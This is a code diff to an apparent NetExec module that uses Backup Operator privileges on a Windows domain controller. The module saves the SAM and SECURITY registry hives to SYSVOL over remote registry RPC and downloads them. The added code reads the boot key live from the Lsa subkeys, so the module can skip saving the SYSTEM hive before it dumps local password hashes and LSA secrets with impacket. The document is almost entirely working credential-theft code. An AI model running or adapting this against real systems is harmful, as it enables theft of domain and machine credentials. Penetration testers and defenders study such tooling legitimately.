@@ -1,5 +1,6 @@
 import contextlib
 import re
+from binascii import unhexlify
 
 from impacket.examples.secretsdump import SAMHashes, LSASecrets, LocalOperations
 from impacket.smbconnection import SessionError
@@ -23,9 +24,60 @@ class NXCModule:
         self.machine_account_hash = None
         self.cleanup_user = None
         self.cleanup_hash = None
+        self.system_hive_saved = False
 
     def options(self, context, module_options):
         """NO OPTIONS"""
+
+    def get_boot_key(self, context, dce):
+        """
+        Reads the boot key LIVE from the four Lsa subkeys' class-name field over RPC,
+        using the already-connected `dce` this module sets up for the SAM/SECURITY
+        hive saves. If this succeeds, no SYSTEM hive is ever saved to SYSVOL or
+        downloaded at all.
+
+        Hand-ported from impacket's RemoteOperations.getBootKey() rather than calling
+        RemoteOperations directly, because RemoteOperations.enableRegistry() starts the
+        RemoteRegistry service via the Service Control Manager -- which needs admin-level
+        rights a plain Backup Operator doesn't have. This module already gets
+        RemoteRegistry running via trigger_winreg()'s named-pipe trick instead, which
+        works within Backup Operator's actual privileges (SeBackupPrivilege), so we reuse
+        that connection here.
+
+        Raises on any failure (access denied, path not allowed remotely, RPC error, etc.)
+        so the caller can fall back to the full SYSTEM hive save/download path.
+        """
+        boot_key = b""
+        ans = rrp.hOpenLocalMachine(dce)
+        reg_handle = ans["phKey"]
+
+        for key in ["JD", "Skew1", "GBG", "Data"]:
+            context.log.debug(f"Retrieving class info for Lsa\\{key}")
+            ans = rrp.hBaseRegOpenKey(
+                dce,
+                reg_handle,
+                f"SYSTEM\\CurrentControlSet\\Control\\Lsa\\{key}",
+                dwOptions=rrp.REG_OPTION_BACKUP_RESTORE | rrp.REG_OPTION_OPEN_LINK,
+                samDesired=rrp.KEY_READ,
+            )
+            key_handle = ans["phkResult"]
+            ans = rrp.hBaseRegQueryInfoKey(dce, key_handle)
+            class_out = ans["lpClassOut"]
+            if isinstance(class_out, str):
+                class_out = class_out.encode()
+            boot_key += class_out[:-1]
+            rrp.hBaseRegCloseKey(dce, key_handle)
+
+        rrp.hBaseRegCloseKey(dce, reg_handle)
+
+        transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
+        boot_key = unhexlify(boot_key)
+
+        final_boot_key = b""
+        for i in range(len(boot_key)):
+            final_boot_key += boot_key[transforms[i]:transforms[i] + 1]
+
+        return final_boot_key
 
     def on_login(self, context, connection):
         connection.args.share = "SYSVOL"
@@ -36,8 +88,11 @@ class NXCModule:
         connection.trigger_winreg()
         dce = NXCRPCConnection(connection).connect(r"\winreg", rrp.MSRPC_UUID_RRP)
 
+        boot_key = None
         try:
-            for hive in ["HKLM\\SAM", "HKLM\\SYSTEM", "HKLM\\SECURITY"]:
+            # Large hives can take minutes to save before the RPC call returns.
+            connection.conn.setTimeout(max(connection.args.smb_timeout, 60))
+            for hive in ["HKLM\\SAM", "HKLM\\SECURITY"]:
                 hRootKey, subKey = self._strip_root_key(dce, hive)
                 outputFileName = f"\\\\{connection.host}\\SYSVOL\\{subKey}_{rand_suffix}"
                 context.log.debug(f"Dumping {hive}, be patient it can take a while for large hives (e.g. HKLM\\SYSTEM)")
@@ -48,17 +103,44 @@ class NXCModule:
                 except Exception as e:
                     context.log.fail(f"Couldn't save {hive}: {e} on path {outputFileName}")
                     return
+
+            try:
+                context.log.display("Attempting to retrieve boot key live from the remote registry...")
+                boot_key = self.get_boot_key(context, dce)
+                context.log.highlight("Boot key retrieved live -- skipping SYSTEM hive save/download.")
+            except Exception as e:
+                context.log.fail(f"Live boot key retrieval failed ({type(e).__name__}: {e}), falling back to full SYSTEM hive download...")
+                boot_key = None
+
+            if boot_key is None:
+                hRootKey, subKey = self._strip_root_key(dce, "HKLM\\SYSTEM")
+                outputFileName = f"\\\\{connection.host}\\SYSVOL\\{subKey}_{rand_suffix}"
+                context.log.debug("Dumping HKLM\\SYSTEM, be patient it can take a while for large hives (e.g. HKLM\\SYSTEM)")
+                try:
+                    ans2 = rrp.hBaseRegOpenKey(dce, hRootKey, subKey, dwOptions=rrp.REG_OPTION_BACKUP_RESTORE | rrp.REG_OPTION_OPEN_LINK, samDesired=rrp.KEY_READ)
+                    rrp.hBaseRegSaveKey(dce, ans2["phkResult"], outputFileName)
+                    context.log.highlight(f"Saved HKLM\\SYSTEM to {outputFileName}")
+                    self.system_hive_saved = True
+                except Exception as e:
+                    context.log.fail(f"Couldn't save HKLM\\SYSTEM: {e} on path {outputFileName}")
+                    return
         except (Exception, KeyboardInterrupt) as e:
             context.log.fail(f"Unexpected error: {e}")
             return
         finally:
+            connection.conn.setTimeout(connection.args.smb_timeout)
             with contextlib.suppress(Exception):
                 dce.disconnect()
 
         # copy remote file to local
         log_path = f"{connection.output_filename}."
-        for hive in ["SAM", "SECURITY", "SYSTEM"]:
+        connection.conn.setTimeout(max(connection.args.smb_timeout, 60))
+        hives_to_download = ["SAM", "SECURITY"]
+        if self.system_hive_saved:
+            hives_to_download.append("SYSTEM")
+        for hive in hives_to_download:
             connection.get_file_single(f"{hive}_{rand_suffix}", log_path + hive)
+        connection.conn.setTimeout(connection.args.smb_timeout)
 
         # read local file
         try:
@@ -84,8 +166,10 @@ class NXCModule:
                         self.machine_account = account_name if account_name.endswith("$") else f"{connection.hostname}$"
                         return
 
-            local_operations = LocalOperations(log_path + "SYSTEM")
-            boot_key = local_operations.getBootKey()
+            if boot_key is None:
+                local_operations = LocalOperations(log_path + "SYSTEM")
+                boot_key = local_operations.getBootKey()
+
             sam_hashes = SAMHashes(log_path + "SAM", boot_key, isRemote=False, perSecretCallback=parse_sam)
             sam_hashes.dump()
             sam_hashes.finish()
@@ -137,7 +221,9 @@ class NXCModule:
         connection.create_conn_obj()
         if connection.hash_login(connection.domain, username, user_hash):
             context.log.display(f"Cleaning dump with user {username} on domain {connection.domain}")
-            hives = ["SAM", "SECURITY", "SYSTEM"]
+            hives = ["SAM", "SECURITY"]
+            if self.system_hive_saved:
+                hives.append("SYSTEM")
             all_deleted = True
             for hive in hives:
                 remote_name = f"{hive}_{rand_suffix}"
@@ -194,7 +280,10 @@ class NXCModule:
         return None, None
 
     def _print_cleanup_warning(self, context, rand_suffix):
-        context.log.fail(f"Files were not automatically deleted. Please clean up manually: C:\\Windows\\sysvol\\sysvol\\SECURITY_{rand_suffix}, SAM_{rand_suffix}, SYSTEM_{rand_suffix}")
+        paths = f"C:\\Windows\\sysvol\\sysvol\\SECURITY_{rand_suffix}, SAM_{rand_suffix}"
+        if self.system_hive_saved:
+            paths += f", SYSTEM_{rand_suffix}"
+        context.log.fail(f"Files were not automatically deleted. Please clean up manually: {paths}")
 
     def _strip_root_key(self, dce, key_name):
         # Let's strip the root key
